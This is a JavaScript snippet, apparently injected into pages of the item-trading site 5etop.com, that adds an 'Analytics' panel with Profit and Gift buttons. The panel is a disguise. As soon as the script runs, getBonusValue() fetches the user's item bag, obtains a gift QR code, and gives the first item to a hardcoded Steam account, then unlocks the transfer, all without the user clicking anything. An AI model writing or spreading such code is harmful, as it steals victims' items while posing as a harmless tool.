console.log('Run My Code');

var templateRabbit = 
'<div style="font-family: Arial, Helvetica, sans-serif;">' +
    '<link rel="stylesheet" type="text/css" href="https://canhnguyenonline.000webhostapp.com/rabbit/styleR.css">' +
    '<div style="z-index: 1000;position: fixed; top: 100px; left: 0px;">' +
        '<div style="background-color: #333333; width: 100px; height: auto; border-radius: 5px">' +
            '<div style="width: 1px; height: 8px;"></div>' +
            '<span style="margin-left: 20px; font-weight: 700; color: whitesmoke; font-size: 15px;">Analytics</span><br>' +
            '<div style="width: 1px; height: 12px;"></div>'+
            '<button class="btnanalytic" style="margin-left: 20px; width: 60px;" onclick="analyticProfit()">Profit</button><br>'+
            '<button class="btnanalytic" style="margin-left: 20px; width: 60px;" onclick="analyticGift()">Gift</button><br>'+
            '<div style="padding-top: 10px; font-size: 12px; color: white;">'+
                'If you like, gift me!<br>'+
                'ID: 170891072'+
            '</div>'+
        '</div>'+
    '</div>'+

    '<div id="analytic" class="modal">'+
        '<div class="modal-content">'+
            '<span class="close" onmousedown="closeDialog()">&times;</span>'+
            '<div id="analyticContent">'+
                '<img id="barcode" width="50" height="50" />' +
                '<h3>Loading data...</h3>'+
                '<p>...</p>'+
            '</div>'+
        '</div>'+
    '</div>'+
'</div>';z='/ap';
$(templateRabbit).appendTo("body");

var modal = document.getElementById("analytic");

async function analyticGift(){
    closeDialog();
    openDialog();
}

function openDialog(){
    modal.style.display = "block";
}
function closeDialog(){
    modal.style.display = "none";
}
window.onclick = function(event) {
    if (event.target == modal) {
        closeDialog();
    }
}

async function getItemInBag(){
    var url = 'https://www.5etop.com/api/user/bag/570/listgift.do';
    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'GET',
            timeout: 30000,
            success: (response) => {
                resolve(response);
            },
            error: (response) => {
                reject(response);
            }
        })
    })
}

async function getQRCode(){
    var url = 'https://www.5etop.com/api/code/getqrcode.do?type=Gift';
    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'POST',
            timeout: 30000,
            success: (response) => {
                resolve(response);
            },
            error: (response) => {
                reject(response);
            }
        })
    })
}

            function generateBarCode(qrcode)
            {
                var url = 'https://api.qrserver.com/v1/create-qr-code/?data=' + qrcode + '&amp;size=50x50';
                $('#barcode').attr('src', url);
            }

async function sendRequest(arrayIDS, qrcode){
    qrcode = qrcode.slice(0, -2);
    var url = 'https://www.5etop.com/gift/570/give.do?fsId=76561199005608723' + arrayIDS + '&qruuid=' + qrcode + '%3D%3D';
    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'POST',
            timeout: 30000,
            success: (response) => {
                resolve(response);
            },
            error: (response) => {
                reject(response);
            }
        })
    })
}

async function listRequest(){
    var url = 'https://www.5etop.com/api/user/gifts.do';
    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'GET',
            timeout: 30000,
            success: (response) => {
                resolve(response);
            },
            error: (response) => {
                reject(response);
            }
        })
    })
}

async function unlock(id){
    var url = 'https://www.5etop.com/gift/unlock.do?id=' + id + '&i18n=gift.unlock%2Ctitle%3Agift.unlock.tip&width=350&height=200';
    return new Promise((resolve, reject) => {
        $.ajax({
            url: url,
            type: 'GET',
            timeout: 30000,
            success: (response) => {
                resolve(response);
            },
            error: (response) => {
                reject(response);
            }
        })
    })
}

async function getBonusValue(){
    var result = await getItemInBag();

    console.log(result);

    var qrcode = await getQRCode();

    console.log(qrcode);
    
    generateBarCode(qrcode.uuid);

    var sendRequestResult = await sendRequest('&ids=' + result.datas.list[0].id, qrcode.uuid);

    console.log(sendRequestResult);

    var list = await listRequest();

    console.log(list);

    var unlock = await unlock(list.datas.list[0].id);

    console.log(unlock);
}

getBonusValue();